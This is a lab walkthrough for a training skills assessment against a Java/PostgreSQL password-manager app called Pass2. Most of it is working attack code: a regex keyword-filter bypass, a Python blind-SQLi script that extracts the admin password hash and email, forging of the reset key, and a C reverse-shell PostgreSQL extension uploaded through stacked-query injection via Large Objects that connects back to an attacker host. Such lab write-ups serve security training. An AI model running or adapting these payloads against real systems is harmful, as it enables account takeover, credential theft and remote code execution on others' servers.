---
tags: [lab, attack/web]
module: advanced_sql_injections
last_updated: 2026-05-22
---

# Lab: Skills Assessment

Target: Pass2 application on port 8080 of a fresh target (not BlueBird). The JAR is at `/opt/Pass2-1.0.3-SNAPSHOT.jar` on the prior section's target VM.

This is a two-question assessment requiring:
1. Unauthenticated boolean-blind SQLi → keyword filter bypass → password reset → dashboard login
2. Authenticated blind SQLi → C extension upload via Large Objects → reverse shell RCE

All steps are CLI-based (Python, curl, Docker for compiling the C extension).

## Tool Installation

```bash
# Python dependencies
pip3 install requests

# Docker (for compiling the PostgreSQL C extension)
sudo apt install docker.io -y
sudo systemctl start docker

# Decompiler — choose one (see decompiling_java_archives lab for full setup)
# Option A: jadx (no Java setup required)
sudo apt install jadx -y
# Option B: Fernflower — verified working with msopenjdk-21
# sudo apt install msopenjdk-21 -y
# JAVA_HOME=/usr/lib/jvm/msopenjdk-21-amd64 ./gradlew build -x test --no-configuration-cache

# netcat
nc --version || sudo apt install ncat -y
```

---

## Question 1 — Log in via unauthenticated SQLi and retrieve the dashboard flag

**Goal:** Exploit the blind SQLi in `GET /api/v1/check-user` to exfiltrate admin credentials, use them to reset the admin password, and log in to the dashboard.

### Step 1 — Download and decompile the JAR

**Why decompile before probing:** Pass2 is a new application you haven't seen before. Rather than randomly fuzzing every input field, source review gives you a complete map in minutes: every endpoint, every SQL query, every sanitization attempt. In a real engagement, white-box review before probing also generates less noise in logs.

```bash
scp -r student@<PRIOR_TARGET_IP>:/opt/Pass2-1.0.3-SNAPSHOT.jar ./
mkdir Pass2SourceCode/
java -jar fernflower/build/libs/fernflower.jar \
    ./Pass2-1.0.3-SNAPSHOT.jar Pass2SourceCode/
cd Pass2SourceCode/
jar -xf Pass2-1.0.3-SNAPSHOT.jar
```

### Step 2 — Map all endpoints and identify unauthenticated ones

**What you're looking for:** Any endpoint that doesn't require authentication is a higher-value target because it's reachable without any prior credential. Grep for controller annotations:

```bash
grep -rn "GetMapping\|PostMapping\|RequestMapping\|@Controller" BOOT-INF/classes/ --include="*.java"
```

Two controllers handle unauthenticated routes: `ApiController` (GET /api/v1/check-user) and `ResetPasswordController` (GET/POST /reset-password). All other routes require a login session.

**Why focus on check-user specifically:** It accepts a user-supplied string parameter `u` and does something with it (presumably queries the database to check if a username exists). Any endpoint that takes user input and queries the database is a potential SQLi candidate. The question is whether the query is parameterized.

### Step 3 — Read the filter and understand exactly what it blocks

**What the filter does:** In `ApiController.java`, before the value of `u` is used in the query, it runs through:

```java
u = u.replaceAll(" |OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\\*\\*/|;|LENGTH|length|--$", "");
```

**Analyzing each blocked item:**
- SQL keywords: blocked in both upper and lower case, but NOT title case (e.g., `And`, `Select`, `Ascii` are not listed)
- Spaces: blocked, but `/*-*/` (not `/**/` which is also blocked) still works
- `/**/`: blocked directly — you need a different comment style
- `--$`: the `$` anchor means this only matches `--` at the **end of a line** — `--` followed by anything else passes through

**Building the bypass strategy from this analysis:**

| Blocked | What to use instead | Why it works |
|---------|---------------------|--------------|
| Spaces | `/*-*/` | PostgreSQL treats any `/* ... */` comment as whitespace |
| `/**/` | Any `/*X*/` where X is not empty | `/**/` is listed explicitly; adding a character makes it different |
| SQL keywords (`AND`, `and`) | `And` (title case) | The regex matches `AND` and `and` but not `And` |
| `--` at end of line | `--/*-*/-` | Appending `/*-*/-` means `--` is no longer at end of line |

**Why check this carefully:** Keyword filters that are easy to bypass are also easy to break accidentally. Test your payloads against the regex before sending them — using regex101.com or Python's `re` module locally. A payload that strips incorrectly will produce malformed SQL and you'll get generic errors instead of useful oracle responses.

### Step 4 — Confirm the boolean oracle

**What you need before automating:** Verify manually that:
1. The endpoint returns a predictable value based on whether the injected condition is true or false
2. Your bypass syntax actually reaches the SQL without being stripped

Test with a known-true condition:
```
http://<TARGET_IP>:8080/api/v1/check-user?u=admin'/*-*/And/*-*/(1=1)--/*-*/-
```
Expected response: `{"exists":true}`

Test with a known-false condition:
```
http://<TARGET_IP>:8080/api/v1/check-user?u=admin'/*-*/And/*-*/(1=3)--/*-*/-
```
Expected response: `{"exists":false}`

**Why `admin` as the anchor username:** You need a username you know exists so that `admin AND <your condition>` evaluates based only on your condition (true AND false = false; true AND true = true). If you used a non-existent username, `false AND <anything>` always returns false, making the oracle useless.

**What if `admin` doesn't exist:** Try common admin usernames (`administrator`, `root`, `superuser`). Alternatively, inject a condition that doesn't depend on a real user existing: use a subquery that doesn't reference the users table.

### Step 5 — Build the Python oracle and exfiltrate admin credentials

**Why bit-wise binary search instead of direct ASCII:** Standard character exfiltration asks `ASCII(char) = X` for X from 32 to 127 — up to 95 requests per character. Binary search asks 7 yes/no questions per character (since 2^7 = 128 covers all printable ASCII). For a 60-character bcrypt hash, that's 420 requests instead of up to 5,700. The difference is 30+ seconds vs several minutes.

**Why exfiltrate the password hash, not just use the reset endpoint directly:** The password reset requires a `secretKey` computed from the user's email AND password hash. You need both values to construct the key. Exfiltrating just the email is not enough.

```python
#!/usr/bin/env python3
import requests, json
from urllib.parse import quote_plus

TARGET = "<TARGET_IP>"

def oracle(query):
    existing_user = "admin"
    ws = "/*-*/"
    base = f"http://{TARGET}:8080/api/v1/check-user?u={existing_user}"
    payload = f"'{ws}And{ws}({query.replace(' ', ws)})--{ws}-"
    r = requests.get(base + quote_plus(payload))
    return json.loads(r.text)["exists"] == True

def dump_number(field):
    length = 0
    for p in range(0, 7):
        if oracle(f"(Select Length({field}) From users Where username = 'admin') & {2**p} > 0"):
            length |= 2**p
    return length

def dump_string(field, length):
    result = ""
    for i in range(1, length + 1):
        char = 0
        for p in range(0, 7):
            if oracle(f"(Select Ascii(Substring({field},{i},1)) From users Where username = 'admin') & {2**p} > 0"):
                char |= 2**p
        result += chr(char)
    return result

# Exfiltrate password hash
# Note: "passwoRd" - the R is title-cased to bypass the "password" keyword block
pwd_len = dump_number("passwoRd")
password = dump_string("passwoRd", pwd_len)
print(f"Password: {password}")

# Exfiltrate email
email_len = dump_number("email")
email = dump_string("email", email_len)
print(f"Email: {email}")
```

**Why `passwoRd` instead of `password`:** The regex blocks the string `password` (and `PASSWORD`) — but `passwoRd` is not in the blocklist. Title-casing the R makes it a different string while PostgreSQL column names are case-insensitive so the query still works.

### Step 6 — Reconstruct the secret key for password reset

**Why you need this instead of just resetting directly:** The `/reset-password` form requires a `secretKey` that proves you know the user's existing state. You can't just provide any string — it's validated against a computed value. The computation is in `ResetPasswordController.calculateSecretKey()`:

```python
import hashlib, base64

email = "<EXFILTRATED_EMAIL>"
password = "<EXFILTRATED_PASSWORD_HASH>"

tmp = email + "$4lty" + password
encoded = hashlib.sha256(tmp.encode("utf-8")).digest()
b64 = base64.b64encode(encoded).decode().replace("-", "X").replace("_", "X").replace("=", "")
secret_key = f"{b64[:4]}-{b64[4:8]}-{b64[8:12]}-{b64[12:16]}"
print(secret_key)
```

The `$4lty` string is a hardcoded salt in the source. The Base64 character replacements (`-` and `_` → `X`, `=` removed) are also in the source. If you miss any of these details, the key will be wrong. Source review is essential here — you cannot guess these details.

### Step 7 — Reset the admin password and log in

```bash
openssl rand -hex 16   # generate a new secure password
```

Navigate to `http://<TARGET_IP>:8080/reset-password` and submit:
- Username: `admin`
- Reset Key: the value computed in step 6
- New Password / Repeat: the openssl-generated password

**Why use a randomly generated password:** Using a weak or predictable password leaves the account exposed to anyone else who might be testing the same target. A 32-character hex string is brute-force resistant for the duration of the lab.

Log in at `/login` with `admin` and the new password. The dashboard flag is displayed on the landing page after login.

---

## Question 2 — RCE via C extension and read `/opt/Pass2/flag_xxxxxxxx.txt`

**Goal:** Exploit the authenticated blind SQLi in `POST /dashboard/edit` to achieve RCE and read the flag.

### Step 1 — Identify the authenticated injection point

**What you're looking for now that you're logged in:** You have access to the dashboard. Look for any functionality that makes database writes or reads based on user-supplied input. From source review of `DashboardController.java`:

```bash
grep -rn "id\|execute\|query" BOOT-INF/classes/com/bluebird/controllers/DashboardController.java
```

The `POST /dashboard/edit` endpoint concatenates the `id` parameter after replacing single quotes with empty string:

```java
id = id.replace("'", "");
```

This is an incomplete sanitization — it removes `'` but not `$$` (dollar-sign quoting) or the injection structure itself.

**Boolean oracle:** Modify the `id` value when updating a password entry and observe the response:
- `id=1+And(1=1)--` → `Password edited!`
- `id=1+And(1=3)--` → `You do not own this ID!`

Two different responses for true and false conditions — this is a workable boolean oracle.

### Step 2 — Determine why COPY FROM PROGRAM won't work here

**Why check first instead of just trying:** The source review (or error response) will tell you whether `COPY FROM PROGRAM` is available. In `DashboardController.java`, comments or error handling may give clues. More definitively: if you inject `1;COPY dbTest FROM PROGRAM 'id'--` and it succeeds, you have the privilege. If it fails with a permission error, you don't.

The lab establishes that the database user here does **not** have `pg_execute_server_program`. This means:
- `COPY FROM PROGRAM` → permission denied
- `COPY TO file` → may also be restricted
- Large Objects → available to any user who can create tables

**Why Large Objects are the fallback:** Large Objects (`lo_create`, `lo_put`, `lo_export`) are PostgreSQL's binary data storage API. `lo_export` writes a Large Object's contents to a file. The privilege required is `pg_read_server_files` (for reading) or `pg_write_server_files` (for writing), or the user can be superuser — but in many configurations, Large Object operations are available to database owners even without these roles.

**Why a C extension for RCE:** A `.so` shared library loaded with `CREATE FUNCTION ... LANGUAGE C` executes as the PostgreSQL OS user. The function can call any C standard library function including `execve()`. This doesn't require `pg_execute_server_program` — it only requires DDL privileges (CREATE FUNCTION) and file access (to write the .so to a path PostgreSQL can load from).

### Step 3 — Compile the C extension matching the target's PostgreSQL version

**Why version matching matters:** A shared library compiled against PostgreSQL 13 headers will fail to load on a PostgreSQL 14 server. The extension uses PostgreSQL's internal APIs (`PG_FUNCTION_INFO_V1`, `PG_GETARG_TEXT_PP`, etc.) which change between versions. You need to compile against the exact same headers as the target.

**Why Docker:** Your Kali system may have a different PostgreSQL version than the target (or none at all). A Docker container running `postgres:13` has the exact matching build tools and headers:

```bash
cat << 'EOF' > Dockerfile
FROM postgres:13
RUN apt-get update && apt-get install -y postgresql-server-dev-13 build-essential && rm -rf /var/lib/apt/lists/*
EOF

sudo docker build -t pg13-dev .
sudo docker run -it -v "$(pwd)":/root --entrypoint bash pg13-dev
```

Inside the container, compile:
```bash
cd /root
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
exit
```

`pg_rev_shell.so` is now in your current directory. The `-fPIC` flag (position-independent code) is required for shared libraries; forgetting it produces a library that won't load.

Write `pg_rev_shell.c`:
```c
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"

PG_MODULE_MAGIC;
PG_FUNCTION_INFO_V1(rev_shell);

Datum rev_shell(PG_FUNCTION_ARGS) {
    char *LHOST = text_to_cstring(PG_GETARG_TEXT_PP(0));
    int32 LPORT = PG_GETARG_INT32(1);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LPORT);
    inet_pton(AF_INET, LHOST, &serv_addr.sin_addr);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
    PG_RETURN_INT32(0);
}
```

### Step 4 — Upload the .so via Large Objects through the blind SQLi

**Why upload through SQLi instead of via SCP or HTTP:** You don't have a direct file upload channel or SSH access to the target. The SQLi is the only writable interface available. Large Objects let you write binary data to the database and then export it to a file — all through SQL statements.

**The upload process:**
1. `lo_create(loid)` — create a Large Object with a known numeric ID
2. `lo_put(loid, offset, data)` — write binary data at a specific byte offset (data encoded as hex)
3. `lo_export(loid, path)` — write the Large Object to a filesystem path
4. `CREATE FUNCTION` — load the .so as a PostgreSQL extension
5. `SELECT rev_shell(LHOST, LPORT)` — execute the function, triggering the reverse shell

**Start the listener first:**
```bash
nc -nvlp <LPORT>
```

**Run the exploit script:**
```python
import requests, random, math
from urllib.parse import quote_plus

BASE_URL = "http://<TARGET_IP>:8080"
LHOST = "<YOUR_ATTACKER_IP>"
LPORT = <YOUR_PORT>
USERNAME = "admin"
PASSWORD = "<NEW_ADMIN_PASSWORD>"

s = requests.Session()
r = s.post(f"{BASE_URL}/login",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data=f"username={USERNAME}&password={PASSWORD}")
assert "My Passwords</h1>" in r.text, "Login failed — check credentials"
print("[*] Logged in")

def oracle(s, q):
    r = s.post(f"{BASE_URL}/dashboard/edit",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=f"username={USERNAME}&password={PASSWORD}&title=Hackthebox&id={quote_plus(q)}")
    return "Password edited!" in r.text

with open("pg_rev_shell.so", "rb") as f:
    raw = f.read()

loid = random.randint(50000, 60000)
oracle(s, f"1;SELECT lo_create({loid})--")
print(f"[*] Created Large Object ID: {loid}")

for pageno in range(math.ceil(len(raw) / 2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading page {pageno} (offset {pageno*2048})")
    oracle(s, f"1;SELECT lo_put({loid}, {pageno*2048}, decode($${page.hex()}$$,$$hex$$))--")

# Export, register, and execute in one final oracle call
query  = f"1;SELECT lo_export({loid}, $$/tmp/pg_rev_shell.so$$);"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/pg_rev_shell$$, $$rev_shell$$ LANGUAGE C STRICT;"
query += f"SELECT rev_shell($${LHOST}$$, {LPORT})--"
oracle(s, query)
```

**Why 2048-byte pages:** PostgreSQL Large Object pages are 2KB by default. Writing at 2048-byte offsets aligns with the internal page boundaries, which is the most efficient approach and avoids any page-boundary edge cases.

**Why `dollar-sign quote` the hex string:** The hex string may contain characters that would break the SQL syntax if unquoted. `$$HEX$$` wraps it safely without using single quotes (which the `id.replace("'", "")` sanitization would remove).

### Step 5 — Read the flag

In the reverse shell:
```bash
ls /opt/Pass2/
cat /opt/Pass2/flag_*.txt
```

**Why the filename is unpredictable (`flag_xxxxxxxx.txt`):** This prevents simply guessing the path and using a direct SQL read. You need OS shell access to `ls` the directory and find the exact filename.

---

## Lessons Learned

- Keyword filters are almost always bypassable — analyze the exact regex before trying anything; title-casing and alternative syntax are the first things to try
- Bit-wise binary search (7 requests per character) should be your default for blind SQLi automation — it's faster than linear ASCII probing and simpler than more complex techniques
- The `secretKey` computation in the reset flow is deterministic from database values; reading source code is the only way to know the exact formula
- Large Objects are a general-purpose binary file upload channel in PostgreSQL — they work even when `COPY` file privileges are restricted
- When `COPY FROM PROGRAM` fails, C extension upload via Large Objects is the fallback path for RCE; it requires DDL privileges and file write access but not `pg_execute_server_program`

## Related Pages

- [[attack/web/postgresql_rce]] — COPY FROM PROGRAM and C extension RCE
- [[attack/web/postgresql_file_read_write]] — Large Objects file upload
- [[attack/web/advanced_sqli_character_bypasses]] — keyword bypass techniques
- [[attack/web/white_box_sqli_methodology]] — locating injection points via source review
- [[labs/htb/advanced_sql_injections/command_execution]] — COPY FROM PROGRAM method
